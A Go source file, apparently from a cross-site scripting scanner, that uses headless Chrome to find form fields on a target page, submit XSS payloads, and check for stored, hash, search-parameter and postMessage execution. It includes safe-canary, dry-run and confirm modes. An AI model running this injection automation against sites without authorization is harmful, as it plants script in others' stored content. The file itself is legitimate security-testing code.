	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	taskCtx, taskCancel, setupErr := newChromeContext(ctx, targetURL, auth, limiter, disableCORS, proxy)
	if setupErr != nil {
		return []VerifyResult{{Source: "stored", Error: true, Detail: "browser setup failed: " + setupErr.Error()}}, false
	}
	defer taskCancel()

	// Step 1: Navigate and find input fields
	var inputJSON string
	jsFindInputs := `
		(function() {
			var results = [];
			var idx = 0;
			document.querySelectorAll('input[type="text"], input[type="search"], input[type="email"], input:not([type]), textarea, [contenteditable="true"]').forEach(function(el) {
				var rect = el.getBoundingClientRect();
				if (rect.width > 0 && rect.height > 0) {
					var selector = '';
					if (el.id) selector = '#' + el.id;
					else if (el.name) selector = el.tagName.toLowerCase() + '[name="' + el.name + '"]';
					else selector = el.tagName.toLowerCase() + '_' + idx;
					results.push({
						tag: el.tagName.toLowerCase(),
						selector: selector,
						id: el.id || '',
						name: el.name || '',
						placeholder: el.placeholder || '',
						index: idx
					});
					idx++;
				}
			});
			return JSON.stringify(results);
		})()
	`

	err := chromedp.Run(taskCtx,
		chromedp.Navigate(targetURL),
		chromedp.Sleep(3*time.Second),
		chromedp.Evaluate(jsFindInputs, &inputJSON),
	)

	if err != nil {
		results = append(results, VerifyResult{
			Source: "stored", Error: true, Detail: "failed to load page: " + err.Error(),
		})
		return results, false
	}

	inputs := parseInputSelectors(inputJSON)

	if len(inputs) == 0 {
		results = append(results, VerifyResult{
			Source: "stored", Error: true, Detail: "no input fields found on page",
		})
		return results, false
	}

	// Convert to safety.InputInfo for dry-run report
	var inputInfos []safety.InputInfo
	for _, input := range inputs {
		inputInfos = append(inputInfos, safety.InputInfo{
			Selector: input.Selector,
			Tag:      input.Tag,
			Name:     input.Name,
		})
	}

	// DRY RUN MODE: Only analyze, don't submit
	if safetyMode.DryRun {
		safety.PrintDryRunReport(inputInfos, false)
		return results, false
	}

	// Build payload list based on safety mode
	var testPayloads []string
	if safetyMode.Safe {
		// Use only safe canary payloads
		testPayloads = safety.GetSafePayloads()
		fmt.Printf("[*] Using %d safe canary payloads (no dangerous code)\n", len(testPayloads))
	} else {
		// Use real payloads (with warning)
		fmt.Println("\n  ⚠️  WARNING: Using real XSS payloads!")
		fmt.Println("  ⚠️  Ensure you have authorization to test this system.")

		canaryPayloads := payloads.GetCanaryPayloads(Canary)
		for _, p := range canaryPayloads {
			testPayloads = append(testPayloads, p.Value)
		}
		if waf != "" {
			for _, p := range payloads.GetPayloadsByWAF(waf) {
				testPayloads = append(testPayloads, p.Value)
			}
		}
	}

	// CONFIRM MODE: Ask before each submission
	submitted := false
	for _, input := range inputs {
		for _, payload := range testPayloads {
			// Safety check: validate payload is safe if in safe mode
			if safetyMode.Safe && !safety.IsSafePayload(payload) {
				continue
			}

			if safetyMode.Confirm {
				action := fmt.Sprintf("Submit payload via %s", input.Selector)
				detail := fmt.Sprintf("Payload: %s", payload)
				if !safety.ConfirmPrompt(action, detail) {
					fmt.Println("  [→] Skipped")
					continue
				}
			}

			r := testStoredInput(taskCtx, targetURL, input, payload)
			results = append(results, r)
			submitted = true

			if r.Triggered {
				fmt.Printf("  [!] Confirmed: %s\n", r.Detail)
			}
		}
	}

	// Step 3: Reload and check persistence (only if we submitted something)
	if submitted {
		var afterHTML string
		var jsTriggered bool

		err = chromedp.Run(taskCtx,
			chromedp.Navigate(targetURL),
			chromedp.Sleep(3*time.Second),
			chromedp.Evaluate(`window.xssTriggered || false`, &jsTriggered),
			chromedp.InnerHTML("html", &afterHTML),
		)

		if err == nil {
			if jsTriggered {
				results = append(results, VerifyResult{
					Source: "stored", Payload: "canary", Triggered: true, Evidence: "execution",
					Detail: "JavaScript executed after page reload (stored XSS confirmed)",
				})
			} else if strings.Contains(afterHTML, Canary) {
				results = append(results, VerifyResult{
					Source: "stored", Payload: "canary", Triggered: false, Evidence: "persisted",
					Detail: "Canary persisted in the DOM after reload; JavaScript execution was not observed",
				})
			}
		}
	}

	return results, submitted
}

// PrintCleanupReminder reminds user to clean up test data after stored XSS testing
func PrintCleanupReminder(submitted bool, safetyMode *safety.SafetyMode) {
	if !submitted || safetyMode.DryRun {
		return
	}

	fmt.Println()
	fmt.Println("╔═══════════════════════════════════════════════════════════════╗")
	fmt.Println("║                    🧹 CLEANUP REMINDER                      ║")
	fmt.Println("╠═══════════════════════════════════════════════════════════════╣")
	fmt.Println("║  Test data was submitted to the target server.               ║")
	fmt.Println("║  Please clean up the test data to avoid leaving traces.      ║")
	fmt.Println("║                                                              ║")
	fmt.Println("║  Recommended actions:                                        ║")
	fmt.Println("║    1. Delete any test posts/comments created                 ║")
	fmt.Println("║    2. Remove test entries from the database                  ║")
	fmt.Println("║    3. Clear any cached test data                             ║")
	fmt.Println("║                                                              ║")

	if safetyMode.Safe {
		fmt.Println("║  Test payloads used: Harmless canary strings                 ║")
		fmt.Println("║    (e.g., XSSPROBE_TEST_<timestamp>)                         ║")
	}

	fmt.Println("╚═══════════════════════════════════════════════════════════════╝")
	fmt.Println()
}

type inputInfo struct {
	Selector string
	Tag      string
	Name     string
	Index    int
}

func parseInputSelectors(jsonStr string) []inputInfo {
	var inputs []inputInfo
	parts := extractJSONArrayItems(jsonStr)
	for _, part := range parts {
		input := inputInfo{
			Selector: extractStr(part, "selector"),
			Tag:      extractStr(part, "tag"),
			Name:     extractStr(part, "name"),
		}
		if input.Selector != "" {
			inputs = append(inputs, input)
		}
	}
	return inputs
}

func extractJSONArrayItems(jsonStr string) []string {
	var items []string
	depth := 0
	start := -1

	for i := 0; i < len(jsonStr); i++ {
		if jsonStr[i] == '{' {
			if depth == 0 {
				start = i
			}
			depth++
		} else if jsonStr[i] == '}' {
			depth--
			if depth == 0 && start >= 0 {
				items = append(items, jsonStr[start:i+1])
				start = -1
			}
		}
	}
	return items
}

func extractStr(jsonObj, key string) string {
	searchKey := `"` + key + `"`
	idx := strings.Index(jsonObj, searchKey)
	if idx == -1 {
		return ""
	}
	rest := jsonObj[idx+len(searchKey):]
	colonIdx := strings.Index(rest, ":")
	if colonIdx == -1 {
		return ""
	}
	rest = rest[colonIdx+1:]
	for len(rest) > 0 && (rest[0] == ' ' || rest[0] == '\t') {
		rest = rest[1:]
	}
	if len(rest) == 0 || rest[0] != '"' {
		return ""
	}
	rest = rest[1:]
	endIdx := strings.Index(rest, `"`)
	if endIdx == -1 {
		return ""
	}
	return rest[:endIdx]
}

func testStoredInput(ctx context.Context, baseURL string, input inputInfo, payload string) VerifyResult {
	result := VerifyResult{
		Source:  "stored:" + input.Selector,
		Payload: payload,
	}

	var fillJS string
	if input.Tag == "textarea" || input.Tag == "input" {
		fillJS = fmt.Sprintf(`
			var el = document.querySelector(%q);
			if (el) { el.value = %q; el.dispatchEvent(new Event('input', {bubbles:true})); }
		`, input.Selector, payload)
	} else {
		// contenteditable
		fillJS = fmt.Sprintf(`
			var el = document.querySelector(%q);
			if (el) { el.innerHTML = %q; el.dispatchEvent(new Event('input', {bubbles:true})); }
		`, input.Selector, payload)
	}

	submitJS := fillJS + `
		(function() {
			var el = document.querySelector(` + fmt.Sprintf("%q", input.Selector) + `);
			var form = el ? el.closest('form') : null;
			if (form) {
				var btn = form.querySelector('button[type="submit"], input[type="submit"], button');
				if (btn) btn.click(); else form.submit();
				return 'submitted';
			}
			return 'no_form';
		})()
	`

	var domContent string
	var jsTriggered bool
	var submitResult string

	err := chromedp.Run(ctx,
		chromedp.Evaluate(fillJS, nil),
		chromedp.Sleep(500*time.Millisecond),
		chromedp.Evaluate(submitJS, &submitResult),
		chromedp.Sleep(3*time.Second),
		chromedp.Evaluate(`window.xssTriggered || false`, &jsTriggered),
		chromedp.InnerHTML("html", &domContent),
	)

	if err != nil {
		result.Detail = "error: " + err.Error()
		result.Error = true
		return result
	}

	if jsTriggered {
		result.Triggered = true
		result.Evidence = "execution"
		result.Detail = "JS executed after form submission via " + input.Selector
	} else if strings.Contains(domContent, Canary) {
		result.Triggered = false
		if isCanaryExecutable(domContent, Canary) {
			result.Evidence = "executable_context"
			result.Detail = "Canary reached a potential executable context via " + input.Selector + "; execution was not observed"
		} else {
			result.Evidence = "reflected"
			result.Detail = "Canary reflected in DOM via " + input.Selector + "; JavaScript execution was not observed"
		}
	}

	return result
}

// TestHashOnly tests only hash-based XSS (for analyzer)
func TestHashOnly(targetURL string, auth *AuthConfig, waf string, config *PayloadConfig, disableCORS bool, proxy string) VerifyResult {
	return TestHashOnlyWithLimiter(targetURL, auth, waf, config, nil, disableCORS, proxy)
}

func TestHashOnlyWithLimiter(targetURL string, auth *AuthConfig, waf string, config *PayloadConfig, limiter *compliance.RateLimiter, disableCORS bool, proxy string) VerifyResult {
	payloads := getTestPayloads(waf, config, false)
	if len(payloads) == 0 {
		return VerifyResult{Source: "hash", Error: true, Detail: "no payloads available"}
	}

	// Use first canary payload
	payload := payloads[0]
	return testHash(targetURL, payload, auth, limiter, disableCORS, proxy)
}

// TestSearchOnly tests only search parameter XSS (for analyzer)
func TestSearchOnly(targetURL string, auth *AuthConfig, waf string, config *PayloadConfig, disableCORS bool, proxy string) VerifyResult {
	return TestSearchOnlyWithLimiter(targetURL, auth, waf, config, nil, disableCORS, proxy)
}

func TestSearchOnlyWithLimiter(targetURL string, auth *AuthConfig, waf string, config *PayloadConfig, limiter *compliance.RateLimiter, disableCORS bool, proxy string) VerifyResult {
	payloads := getTestPayloads(waf, config, false)
	if len(payloads) == 0 {
		return VerifyResult{Source: "search", Error: true, Detail: "no payloads available"}
	}

	payload := payloads[0]
	params := []string{"q", "search", "id", "page", "input", "name", "s"}
	params = includeTargetURLParams(targetURL, params)

	for _, param := range params {
		r := testSearchParam(targetURL, param, payload, auth, limiter, disableCORS, proxy)
		if r.Error {
			return r
		}
		if r.Triggered {
			return r
		}
	}

	return VerifyResult{Source: "search", Payload: payload, Detail: "not triggered"}
}

func includeTargetURLParams(targetURL string, params []string) []string {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return params
	}
	query := parsed.Query()
	keys := make([]string, 0, len(query))
	for key := range query {
		if strings.TrimSpace(key) != "" {
			keys = append(keys, key)
		}
	}
	sort.Strings(keys)

	result := make([]string, 0, len(keys)+len(params))
	seen := make(map[string]bool, len(keys)+len(params))
	for _, key := range keys {
		if !seen[key] {
			result = append(result, key)
			seen[key] = true
		}
	}
	for _, param := range params {
		param = strings.TrimSpace(param)
		if param != "" && !seen[param] {
			result = append(result, param)
			seen[param] = true
		}
	}
	return result
}

func includeTargetURLParamContexts(targetURL string, contexts map[string]string) map[string]string {
	if contexts == nil {
		contexts = make(map[string]string)
	} else {
		cloned := make(map[string]string, len(contexts))
		for key, value := range contexts {
			cloned[key] = value
		}
		contexts = cloned
	}
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return contexts
	}
	for key := range parsed.Query() {
		if strings.TrimSpace(key) != "" {
			if _, exists := contexts[key]; !exists {
				contexts[key] = ""
			}
		}
	}
	return contexts
}

// VerifyPostMessage checks whether a same-window message can execute a benign marker assignment.
func VerifyPostMessage(targetURL string, auth *AuthConfig, waf string, limiter *compliance.RateLimiter, disableCORS bool, proxy string) VerifyResult {
	result := VerifyResult{Source: "postMessage", Payload: "window.__xssprobeMessageCanary=true"}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	taskCtx, taskCancel, setupErr := newChromeContext(ctx, targetURL, auth, limiter, disableCORS, proxy)
	if setupErr != nil {
		result.Error = true
		result.Detail = "browser policy setup failed: " + setupErr.Error()
		return result
	}
	defer taskCancel()

	// Send a harmless assignment string. Only the target's message handler can execute it.
	jsPostMessage := `
		(function() {
			window.__xssprobeMessageCanary = false;
			window.postMessage('window.__xssprobeMessageCanary=true', '*');
		})()
	`

	var jsTriggered bool

	err := chromedp.Run(taskCtx,
		chromedp.Navigate(targetURL),
		chromedp.Sleep(2*time.Second),
		chromedp.Evaluate(jsPostMessage, nil),
		chromedp.Sleep(500*time.Millisecond),
		chromedp.Evaluate(`window.__xssprobeMessageCanary === true`, &jsTriggered),
	)

	if err != nil {
		result.Detail = "error: " + err.Error()
		result.Error = true
		return result
	}

	if jsTriggered {
		result.Triggered = true
		result.Evidence = "execution"
		result.Detail = "Target message handler executed the benign canary assignment"
	} else {
		result.Detail = "Target message handler did not execute the benign canary assignment"
	}

	return result
}

// PrintResults prints verification results
func PrintResults(results []VerifyResult) {
	if len(results) == 0 {
		fmt.Println("  [!] No dynamic verification attempts were executed")
		return
	}
	confirmed := 0
	errors := 0
	for _, r := range results {
		if r.Triggered {
			confirmed++
			fmt.Printf("  [\033[31mCONFIRMED\033[0m] Source: %s | Payload: %s\n", r.Source, r.Payload)
			fmt.Printf("             %s\n", r.Detail)
		} else if r.Error {
			errors++
			fmt.Printf("  [\033[33mERROR\033[0m] Source: %s\n", r.Source)
			fmt.Printf("          %s\n", r.Detail)
		}
	}
	if confirmed == 0 {
		if errors > 0 {
			fmt.Printf("  [!] Dynamic verification incomplete: %d/%d attempts failed; no conclusion can be drawn\n", errors, len(results))
		} else {
			fmt.Println("  [✓] No JavaScript execution observed in completed dynamic checks")
		}
	} else {
		fmt.Printf("\n  [!] %d payload(s) confirmed exploitable\n", confirmed)
		if errors > 0 {
			fmt.Printf("  [!] %d additional verification attempt(s) failed\n", errors)
		}
	}

	// Check if any results were obtained with CORS disabled
	corsDisabled := false
	for _, r := range results {
		if r.CORSDisabled {
			corsDisabled = true
			break
		}
	}
	if corsDisabled && confirmed > 0 {
		fmt.Println("\n  ⚠️  WARNING: These results were obtained with -disable-cors (browser same-origin policy disabled).")
		fmt.Println("     Results may NOT represent real-world browser behavior.")
		fmt.Println("     Only use this in isolated testing environments.")
	}
}
